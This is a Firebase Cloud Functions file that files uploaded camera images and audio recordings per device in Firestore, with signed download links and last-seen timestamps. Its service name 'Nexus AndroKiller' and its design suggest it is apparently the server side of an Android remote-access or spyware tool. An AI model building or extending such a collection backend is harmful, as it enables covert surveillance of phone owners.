const functions = require('firebase-functions');
const admin = require('firebase-admin');

admin.initializeApp();
const db = admin.firestore();

/**
 * Trigger Function (Media Handler):
 * Listens for new media files arriving in Firebase Storage.
 * Verifies the file, generates signed download metadata, logs metadata to Firestore,
 * and updates device status timestamps.
 */
exports.handleMediaUpload = functions.storage.object().onFinalize(async (object) => {
  const filePath = object.name; // e.g. "devices/dev_xxxx/camera/snap_12345.jpg"
  const contentType = object.contentType || '';
  const size = parseInt(object.size || '0', 10);
  const bucket = admin.storage().bucket(object.bucket);

  console.log(`[Media Handler] Processing uploaded object: ${filePath} (${contentType}, ${size} bytes)`);

  const pathParts = filePath.split('/');
  if (pathParts[0] !== 'devices' || pathParts.length < 4) {
    console.log(`[Media Handler] Skipping non-device path: ${filePath}`);
    return null;
  }

  const deviceId = pathParts[1];
  const mediaCategory = pathParts[2]; // 'camera' or 'audio'
  const fileName = pathParts.slice(3).join('/');
  const isImage = mediaCategory === 'camera' || contentType.startsWith('image/');
  const isAudio = mediaCategory === 'audio' || contentType.startsWith('audio/');

  const type = isImage ? 'IMAGE' : isAudio ? 'AUDIO' : 'OTHER';

  // Generate public download URL or persistent URL token
  const file = bucket.file(filePath);
  let downloadUrl = '';

  try {
    // Generate signed URL valid for 30 days
    const [url] = await file.getSignedUrl({
      action: 'read',
      expires: Date.now() + 30 * 24 * 60 * 60 * 1000
    });
    downloadUrl = url;
  } catch (err) {
    console.warn(`[Media Handler] Could not generate signed URL: ${err.message}`);
    downloadUrl = `https://firebasestorage.googleapis.com/v0/b/${object.bucket}/o/${encodeURIComponent(filePath)}?alt=media`;
  }

  const mediaDocId = `${deviceId}_${Date.now()}`;
  const mediaRecord = {
    id: mediaDocId,
    deviceId: deviceId,
    type: type,
    storagePath: filePath,
    downloadUrl: downloadUrl,
    fileName: fileName,
    fileSize: size,
    contentType: contentType,
    timestamp: admin.firestore.FieldValue.serverTimestamp()
  };

  const batch = db.batch();

  // 1. Add to device's media subcollection
  const deviceMediaRef = db.collection('devices').doc(deviceId).collection('media').doc(mediaDocId);
  batch.set(deviceMediaRef, mediaRecord);

  // 2. Add to global media collection
  const globalMediaRef = db.collection('media').doc(mediaDocId);
  batch.set(globalMediaRef, mediaRecord);

  // 3. Update device summary document
  const deviceRef = db.collection('devices').doc(deviceId);
  batch.set(
    deviceRef,
    {
      deviceId: deviceId,
      lastMediaUploaded: admin.firestore.FieldValue.serverTimestamp(),
      lastSeen: admin.firestore.FieldValue.serverTimestamp()
    },
    { merge: true }
  );

  // 4. Log event
  const logRef = db.collection('devices').doc(deviceId).collection('logs').doc();
  batch.set(logRef, {
    deviceId: deviceId,
    eventType: 'MEDIA_PROCESSED',
    message: `Processed ${type} upload: ${fileName} (${(size / 1024).toFixed(1)} KB)`,
    level: 'INFO',
    timestamp: admin.firestore.FieldValue.serverTimestamp()
  });

  await batch.commit();
  console.log(`[Media Handler] Successfully registered media record ${mediaDocId} for device ${deviceId}`);
  return true;
});

/**
 * Cleanup expired commands or log metrics.
 */
exports.healthCheck = functions.https.onRequest((req, res) => {
  res.status(200).json({
    status: 'ONLINE',
    service: 'Nexus AndroKiller Cloud Backend',
    timestamp: new Date().toISOString()
  });
});
